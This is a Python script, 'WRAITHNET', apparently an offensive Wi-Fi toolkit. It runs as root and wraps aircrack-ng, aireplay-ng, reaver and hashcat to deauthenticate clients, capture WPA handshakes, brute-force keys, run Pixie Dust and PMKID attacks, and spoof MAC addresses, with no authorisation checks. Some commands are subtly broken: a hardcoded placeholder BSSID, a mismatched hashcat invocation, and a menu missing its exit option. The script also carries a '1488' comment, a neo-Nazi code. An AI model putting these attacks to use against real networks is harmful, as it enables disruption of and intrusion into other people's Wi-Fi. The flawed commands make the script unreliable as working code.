import os
import subprocess
import time
from termcolor import colored
import pyfiglet
import platform

# 1488

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_art = pyfiglet.figlet_format("WRAITHNET", font="doom")
    print(colored("===========================================================", "yellow"))
    print(colored(ascii_art, "yellow"))
    print(colored("   Wi-Fi Penetration Testing Toolkit by @tisheplease, @mp4dev", "yellow"))
    print(colored("===========================================================", "yellow"))
    print(colored("1. Scan Wi-Fi Networks            | 6. Pixie Dust Attack", "yellow"))
    print(colored("2. Analyze Connected Clients      | 7. PMKID Attack", "yellow"))
    print(colored("3. Deauth Attack                  | 8. MAC Spoofing", "yellow"))
    print(colored("4. Capture WPA Handshake          |", "yellow"))
    print(colored("5. Brute Force WPA with Dictionary", "yellow"))
    print(colored("===========================================================", "yellow"))

def scan_networks():
    print(colored("Scanning networks...", "yellow"))
    subprocess.run(["iwlist", "wlan0", "scan"])

def analyze_clients():
    print(colored("Analyzing connected devices...", "yellow"))
    subprocess.run(["airodump-ng", "wlan0"])

def deauth_attack():
    target_mac = input(colored("Enter the MAC address of the client to disconnect: ", "yellow"))
    target_ap = input(colored("Enter the MAC address of the access point: ", "yellow"))
    print(colored(f"Launching Deauth attack on {target_mac}...", "yellow"))
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_ap, "-c", target_mac, "wlan0"])

def capture_handshake():
    print(colored("Capturing WPA handshake...", "yellow"))
    subprocess.run(["airodump-ng", "-c", "6", "--bssid", "00:11:22:33:44:55", "-w", "handshake", "wlan0"])

def brute_force_wpa():
    wordlist = input(colored("Enter the path to the wordlist: ", "yellow"))
    target_ap = input(colored("Enter the BSSID of the access point: ", "yellow"))
    print(colored(f"Launching brute force on {target_ap}...", "yellow"))
    subprocess.run(["aircrack-ng", "-w", wordlist, "-b", target_ap, "handshake.cap"])

def pixie_dust_attack():
    target_ap = input(colored("Enter the BSSID of the access point for Pixie Dust attack: ", "yellow"))
    print(colored(f"Launching Pixie Dust Attack on {target_ap}...", "yellow"))
    subprocess.run(["reaver", "-i", "wlan0", "-b", target_ap, "-vv"])

def pmkid_attack():
    target_ap = input(colored("Enter the BSSID of the access point for PMKID attack: ", "yellow"))
    print(colored(f"Launching PMKID Attack on {target_ap}...", "yellow"))
    subprocess.run(["hashcat", "-m", "16800", "-a", "3", "-w", "3", "pmkid.cap", "rockyou.txt"])

def mac_spoofing():
    new_mac = input(colored("Enter the new MAC address: ", "yellow"))
    subprocess.run(["ifconfig", "wlan0", "down"])
    subprocess.run(["ifconfig", "wlan0", "hw", "ether", new_mac])
    subprocess.run(["ifconfig", "wlan0", "up"])
    print(colored(f"MAC address changed to {new_mac}", "yellow"))

def exit_program():
    confirm = input(colored("Are you sure you want to exit? (y/n): ", "yellow"))
    if confirm.lower() == 'y':
        print(colored("Exiting program...", "yellow"))
        exit(0)
    else:
        print(colored("Returning to the menu...", "yellow"))

def main():
    while True:
        show_menu()
        choice = input(colored("Choose an option: ", "yellow"))

        if choice == "1":
            scan_networks()
        elif choice == "2":
            analyze_clients()
        elif choice == "3":
            deauth_attack()
        elif choice == "4":
            capture_handshake()
        elif choice == "5":
            brute_force_wpa()
        elif choice == "6":
            pixie_dust_attack()
        elif choice == "7":
            pmkid_attack()
        elif choice == "8":
            mac_spoofing()
        elif choice == "9":
            exit_program()
        else:
            print(colored("Invalid choice, try again.", "yellow"))

        input(colored("Press Enter to return to the menu...", "yellow"))

def install_deps() -> int:
    dist = platform.freedesktop_os_release()["NAME"]

    deps = [
        "net-tools",
        "aircrack-ng",
        "reaver",
        "hashcat"
    ]

    try:
        if dist == "Debian GNU/Linux" or dist == "Ubuntu":
            subprocess.run(["apt", "install", "-y"] + deps, check=True)
        elif dist == "Fedora":
            subprocess.run(["dnf", "install", "-y"] + deps, check=True)
        elif dist == "Arch Linux":
            subprocess.run(["pacman", "-S", "--noconfirm"] + deps, check=True)
        else:
            print(colored(f"Operating system {dist} is not supported", "red"))
        print(colored("All dependencies installed successfully!", "green"))
    except subprocess.CalledProcessError as e:
        print(colored(f"Error installing dependencies: {e}", "red"))
        return 1
    return 0

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script must be run as root!")
        exit(1)
    if install_deps() != 0:
        exit(1)
    main()
# mp4 was here
# https://github.com/dev-mp4
# tisheplease was here too
# https://github.com/tisheplease
